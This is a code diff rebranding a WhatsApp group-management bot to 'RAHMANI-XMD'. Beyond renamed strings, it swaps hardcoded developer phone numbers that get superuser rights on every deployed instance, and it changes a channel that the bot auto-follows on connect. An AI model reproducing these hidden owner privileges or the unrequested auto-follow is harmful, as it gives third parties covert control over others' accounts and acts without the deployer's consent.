@@ -86,7 +86,7 @@ setTimeout(() => {
         const sockOptions = {
             version,
             logger: pino({ level: "silent" }),
-            browser: ['Bmw-Md', "safari", "1.0.0"],
+            browser: ['RAHMANI-XMD', "safari", "1.0.0"],
             printQRInTerminal: true,
             fireInitQueries: false,
             shouldSyncHistoryMessage: true,
@@ -522,7 +522,7 @@ zk.ev.on("messages.upsert", async (m) => {
     if (messageContent.slice(1).toLowerCase() === "vcf") {
         if (!sender.endsWith("@g.us")) {
             await zk.sendMessage(sender, {
-                text: `❌ This command only works in groups.\n\n🚀 HEROKU-BT`,
+                text: `❌ This command only works in groups.\n\n🚀 RAHMANI-XMD`,
             });
             return;
         }
@@ -586,18 +586,18 @@ zk.ev.on("messages.upsert", async (m) => {
             var membreGroupe = verifGroupe ? ms.key.participant : '';
             const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName;
-            const dj = '254710772666';
-            const dj2 = '254710772666';
-            const dj3 = "254710772666";
-            const luffy = '254710772666';
+            const dj = '255693629079';
+            const dj2 = '255613300056';
+            const dj3 = "255693629079";
+            const luffy = '255613300056';
             const sudo = await getAllSudoNumbers();
             const superUserNumbers = [servBot, dj, dj2, dj3, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
             const superUser = allAllowedNumbers.includes(auteurMessage);
             
-            var dev = [dj, dj2,dj3,luffy].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
+            var dev = [dj, dj2, dj3, luffy].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
             function repondre(mes) { zk.sendMessage(origineMessage, { text: mes }, { quoted: ms }); }
-            console.log("\t🌍HEROKU-BT IS ONLINE🌍");
+            console.log("\t🌍RAHMANI-XMD IS ONLINE🌍");
             console.log("=========== written message===========");
             if (verifGroupe) {
                 console.log("message provenant du groupe : " + nomGroupe);
@@ -616,7 +616,7 @@ zk.ev.on("messages.upsert", async (m) => {
                 return admin;
             }
 
-            var etat =conf.ETAT;
+            var etat = conf.ETAT;
             if(etat==1)
             {await zk.sendPresenceUpdate("available",origineMessage);}
             else if(etat==2)
@@ -834,7 +834,7 @@ if (conf.AUTO_READ === 'yes') {
 
                 if (action === 'remove') {
                     await zk.sendMessage(origineMessage, {
-                        text: `🚨 *ANTI-LINK | RAHMANI MD*\n@${auteurMessage.split('@')[0]} has been removed for sharing a link.\n\n🚫 Links are not allowed in this group!`,
+                        text: `🚨 *ANTI-LINK | RAHMANI-XMD*\n@${auteurMessage.split('@')[0]} has been removed for sharing a link.\n\n🚫 Links are not allowed in this group!`,
                         mentions: [auteurMessage]
                     });
                     try {
@@ -851,7 +851,7 @@ if (conf.AUTO_READ === 'yes') {
 
                     if (warnCount >= maxWarns) {
                         await zk.sendMessage(origineMessage, {
-                            text: `⚠️ *ANTI-LINK | RAHMANI MD*\n@${auteurMessage.split('@')[0]} has been removed after ${maxWarns} warnings!\n\n🚫 Links are not allowed in this group!`,
+                            text: `⚠️ *ANTI-LINK | RAHMANI-XMD*\n@${auteurMessage.split('@')[0]} has been removed after ${maxWarns} warnings!\n\n🚫 Links are not allowed in this group!`,
                             mentions: [auteurMessage]
                         });
                         try {
@@ -862,14 +862,14 @@ if (conf.AUTO_READ === 'yes') {
                     } else {
                         await ajouterUtilisateurAvecWarnCount(auteurMessage);
                         await zk.sendMessage(origineMessage, {
-                            text: `⚠️ *ANTI-LINK WARNING | RAHMANI MD*\n@${auteurMessage.split('@')[0]} links are not allowed in this group!\n\n⚠️ Warning ${warnCount + 1}/${maxWarns}`,
+                            text: `⚠️ *ANTI-LINK WARNING | RAHMANI-XMD*\n@${auteurMessage.split('@')[0]} links are not allowed in this group!\n\n⚠️ Warning ${warnCount + 1}/${maxWarns}`,
                             mentions: [auteurMessage]
                         });
                     }
 
                 } else {
                     await zk.sendMessage(origineMessage, {
-                        text: `🛡️ *ANTI-LINK | RAHMANI MD*\n@${auteurMessage.split('@')[0]} your message has been deleted.\n\n🚫 Links are not allowed in this group!`,
+                        text: `🛡️ *ANTI-LINK | RAHMANI-XMD*\n@${auteurMessage.split('@')[0]} your message has been deleted.\n\n🚫 Links are not allowed in this group!`,
                         mentions: [auteurMessage]
                     });
                 }
@@ -921,7 +921,7 @@ if (conf.AUTO_READ === 'yes') {
 
                 if (action === 'remove') {
                     await zk.sendMessage(origineMessage, {
-                        text: `🚫 *ANTI-MENTION | RAHMANI MD*\n@${mentionAuteur.split('@')[0]} has been removed for mentioning the group in their status!`,
+                        text: `🚫 *ANTI-MENTION | RAHMANI-XMD*\n@${mentionAuteur.split('@')[0]} has been removed for mentioning the group in their status!`,
                         mentions: [mentionAuteur]
                     });
                     try { await zk.groupParticipantsUpdate(origineMessage, [mentionAuteur], "remove"); } catch (e) {
@@ -934,7 +934,7 @@ if (conf.AUTO_READ === 'yes') {
                     let maxWarns = conf.WARN_COUNT || 3;
                     if (warnCount >= maxWarns) {
                         await zk.sendMessage(origineMessage, {
-                            text: `⚠️ *ANTI-MENTION | RAHMANI MD*\n@${mentionAuteur.split('@')[0]} has been removed after ${maxWarns} warnings!`,
+                            text: `⚠️ *ANTI-MENTION | RAHMANI-XMD*\n@${mentionAuteur.split('@')[0]} has been removed after ${maxWarns} warnings!`,
                             mentions: [mentionAuteur]
                         });
                         try { await zk.groupParticipantsUpdate(origineMessage, [mentionAuteur], "remove"); } catch (e) {
@@ -943,14 +943,14 @@ if (conf.AUTO_READ === 'yes') {
                     } else {
                         await ajouterUtilisateurAvecWarnCount(mentionAuteur);
                         await zk.sendMessage(origineMessage, {
-                            text: `⚠️ *ANTI-MENTION WARNING | RAHMANI MD*\n@${mentionAuteur.split('@')[0]} mentioning the group in your status is not allowed!\n\n⚠️ Warning ${warnCount + 1}/${maxWarns}`,
+                            text: `⚠️ *ANTI-MENTION WARNING | RAHMANI-XMD*\n@${mentionAuteur.split('@')[0]} mentioning the group in your status is not allowed!\n\n⚠️ Warning ${warnCount + 1}/${maxWarns}`,
                             mentions: [mentionAuteur]
                         });
                     }
 
                 } else {
                     await zk.sendMessage(origineMessage, {
-                        text: `🛡️ *ANTI-MENTION | RAHMANI MD*\n@${mentionAuteur.split('@')[0]} mentioning the group in your status is not allowed!`,
+                        text: `🛡️ *ANTI-MENTION | RAHMANI-XMD*\n@${mentionAuteur.split('@')[0]} mentioning the group in your status is not allowed!`,
                         mentions: [mentionAuteur]
                     });
                 }
@@ -982,7 +982,7 @@ if (conf.AUTO_READ === 'yes') {
             var txt = "bot detected, \n";
             const gifLink = "https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif";
             var sticker = new Sticker(gifLink, {
-                pack: 'Zoou-Md',
+                pack: 'RAHMANI-XMD',
                 author: conf.OWNER_NAME,
                 type: StickerTypes.FULL,
                 categories: ['🤩', '🎉'],
@@ -1168,13 +1168,13 @@ zk.ev.on('group-participants.update', async (group) => {
         const metadata = await zk.groupMetadata(group.id);
 
         if (group.action == 'add' && (await recupevents(group.id, "welcome") == 'on')) {
-            let msg = `*HEROKU-BT WELCOME MESSAGE*`;
+            let msg = `*RAHMANI-XMD WELCOME MESSAGE*`;
             let membres = group.participants;
             for (let membre of membres) {
                 msg += ` \n❒ *Hey* 🖐️ @${membre.split("@")[0]} WELCOME TO OUR GROUP. \n\n`;
             }
 
-            msg += `❒ *READ THE GROUP DESCRIPTION TO AVOID GETTING REMOVED BY HEROKU-BT.* `;
+            msg += `❒ *READ THE GROUP DESCRIPTION TO AVOID GETTING REMOVED BY RAHMANI-XMD.* `;
 
             zk.sendMessage(group.id, { image: { url: ppgroup }, caption: msg, mentions: membres });
         } else if (group.action == 'remove' && (await recupevents(group.id, "goodbye") == 'on')) {
@@ -1291,18 +1291,18 @@ zk.ev.on('group-participants.update', async (group) => {
         zk.ev.on("connection.update", async (con) => {
             const { lastDisconnect, connection } = con;
             if (connection === "connecting") {
-                console.log(" Heroku bt is connecting...");
+                console.log(" RAHMANI-XMD is connecting...");
             }
             else if (connection === 'open') {
-                console.log("✅ Heroku bt is Connected to WhatsApp! ☺️");
+                console.log("✅ RAHMANI-XMD is Connected to WhatsApp! ☺️");
                 console.log("--");
                 await (0, baileys_1.delay)(200);
                 console.log("------");
                 await (0, baileys_1.delay)(300);
                 console.log("------------------/-----");
-                console.log("Heroku bt is Online 🕸\n\n");
+                console.log("RAHMANI-XMD is Online 🕸\n\n");
                 //chargement des commandes 
-                console.log("Loading Heroku bt  Commands ...\n");
+                console.log("Loading RAHMANI-XMD Commands ...\n");
                 fs.readdirSync(__dirname + "/commandes").forEach((fichier) => {
                     if (path.extname(fichier).toLowerCase() == (".js")) {
                         try {
@@ -1330,7 +1330,7 @@ zk.ev.on('group-participants.update', async (group) => {
 
                 // ===== AUTO-FOLLOW RAHMANI CHANNEL =====
                 try {
-                    const channelId = "0029VatokI45EjxufALmY32X@newsletter";
+                    const channelId = "120363353854480831@newsletter";
                     await zk.newsletterFollow(channelId);
                     console.log("✅ Auto-followed Rahmani channel successfully!");
                 } catch (e) {
@@ -1344,11 +1344,11 @@ zk.ev.on('group-participants.update', async (group) => {
 
                 let cmsg =` ⁠⁠⁠⁠
 ╭─────────────━┈⊷ 
-│🌍 *ʜᴇʀᴏᴋᴜ-ʙᴛ ɪs ᴄᴏɴɴᴇᴄᴛᴇᴅ*🌍
+│🌍 *RAHMANI-XMD ɪs ᴄᴏɴɴᴇᴄᴛᴇᴅ*🌍
 ╰─────────────━┈⊷
 │💫 ᴘʀᴇғɪx: *[ ${prefixe} ]*
 │⭕ ᴍᴏᴅᴇ: *${md}*
-│💢 ʙᴏᴛ ɴᴀᴍᴇ: *ʜᴇʀᴏᴋᴜ-ʙᴛ*
+│💢 ʙᴏᴛ ɴᴀᴍᴇ: *RAHMANI-XMD*
 ╰─────────────━┈⊷
 
 *Follow our Channel For Updates*
@@ -1429,7 +1429,7 @@ zk.ev.on('group-participants.update', async (group) => {
                             } catch(e) {}
 
                             const botOwnerJid = conf.NUMERO_OWNER + "@s.whatsapp.net";
-                            const notification = `🗑️ *ANTI-DELETE | RAHMANI MD*\n\n📅 *Time:* ${deleteTime}\n💬 *Chat:* ${groupName}\n✍️ *Deleted by:* @${sender}`;
+                            const notification = `🗑️ *ANTI-DELETE | RAHMANI-XMD*\n\n📅 *Time:* ${deleteTime}\n💬 *Chat:* ${groupName}\n✍️ *Deleted by:* @${sender}`;
 
                             if (deletedMessage.message.conversation) {
                                 await zk.sendMessage(botOwnerJid, {
